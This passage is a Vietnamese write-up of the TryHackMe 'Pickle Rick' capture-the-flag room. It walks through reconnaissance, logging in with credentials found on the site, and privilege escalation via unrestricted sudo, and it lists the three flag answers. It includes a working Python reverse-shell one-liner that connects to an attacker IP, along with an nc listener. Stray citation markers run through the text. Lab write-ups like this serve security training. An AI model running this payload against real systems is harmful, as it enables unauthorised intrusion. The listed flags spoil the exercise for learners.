@@ -1,0 +1,95 @@
+https://tryhackme.com/room/picklerick
+TRYHACKME WRITE-UP: PICKLE RICK
+============================================================
+
+BƯỚC 1: RECONNAISSANCE (THU THẬP THÔNG TIN)
+------------------------------------------------------------
+1. Kiểm tra Source Code:
+   - Tại trang chủ, tôi kiểm tra mã nguồn (View Source).
+   - Phát hiện một ghi chú trong thẻ comment HTML.
+   - [cite_start]Thông tin thu được: Username là "R1ckRul3s"[cite: 5].
+
+2. Quét đường dẫn ẩn (Directory Busting):
+   - Sử dụng công cụ Dirsearch để quét các thư mục và file trên server.
+   - Lệnh sử dụng:
+     [cite_start]dirsearch -u http://10.49.160.65/ [cite: 7]
+   
+   - [cite_start]Kết quả quan trọng tìm thấy[cite: 8, 9]:
+     /assets/
+     /login.php
+     /robots.txt
+
+3. Kiểm tra robots.txt:
+   - Truy cập http://10.49.160.65/robots.txt
+   - [cite_start]Nội dung tìm thấy: "Wubbalubbadubdub"[cite: 9].
+   -> Suy luận: Đây có thể là mật khẩu.
+
+------------------------------------------------------------
+BƯỚC 2: INITIAL ACCESS (TRUY CẬP HỆ THỐNG)
+------------------------------------------------------------
+1. Đăng nhập:
+   - [cite_start]Truy cập trang /login.php[cite: 9].
+   - Username: R1ckRul3s
+   - Password: Wubbalubbadubdub
+   -> Đăng nhập thành công, chuyển hướng đến trang "Command Panel".
+
+2. Tạo Reverse Shell:
+   - Tại máy tấn công (Kali), mở cổng lắng nghe:
+     [cite_start]nc -lvnp 4444 [cite: 10]
+   
+   - Tại Command Panel trên web, chèn Payload Python để kết nối ngược về máy Kali:
+     [cite_start]python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("192.168.139.123",4444));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);' [cite: 10]
+
+   -> Kết quả: Nhận được kết nối, chiếm được quyền điều khiển user "www-data".
+
+------------------------------------------------------------
+BƯỚC 3: TÌM KIẾM FLAGS (POST-EXPLOITATION)
+------------------------------------------------------------
+1. Flag 1 (Ingredient 1):
+   - Liệt kê file tại thư mục hiện tại:
+     ls
+   - Đọc nội dung file bí mật:
+     [cite_start]cat Sup3rS3cretPickl3Ingred.txt [cite: 10]
+   -> Kết quả: mr. meeseek hair
+
+   - Kiểm tra gợi ý tiếp theo:
+     [cite_start]cat clue.txt [cite: 10]
+     (Gợi ý: Tìm quanh hệ thống file để thấy nguyên liệu khác).
+
+2. Flag 2 (Ingredient 2):
+   - Di chuyển đến thư mục home của user Rick:
+     cd /home
+     [cite_start]cd rick [cite: 10]
+   
+   - Liệt kê file thấy "second ingredients". Do tên file có dấu cách, cần dùng dấu ngoặc kép để đọc:
+     [cite_start]cat "second ingredients" [cite: 10]
+   -> Kết quả: 1 jerry tear
+
+------------------------------------------------------------
+BƯỚC 4: PRIVILEGE ESCALATION (LEO THANG ĐẶC QUYỀN)
+------------------------------------------------------------
+1. Kiểm tra quyền sudo:
+   - Chạy lệnh để xem user hiện tại được phép làm gì:
+     [cite_start]sudo -l [cite: 11]
+   
+   - Kết quả trả về:
+     (ALL) NOPASSWD: ALL
+   -> User www-data có thể chạy mọi lệnh với quyền root không cần mật khẩu.
+
+2. Leo quyền Root và lấy Flag cuối:
+   - Chuyển sang shell root:
+     [cite_start]sudo bash -i [cite: 11]
+   
+   - Di chuyển đến thư mục root và đọc flag:
+     cd /root
+     ls
+     [cite_start]cat 3rd.txt [cite: 11]
+   -> Kết quả: 3rd ingredients: fleeb juice
+
+============================================================
+TỔNG KẾT
+============================================================
+Đã tìm thấy đủ 3 nguyên liệu (Flags):
+1. mr. meeseek hair
+2. 1 jerry tear
+3. fleeb juice
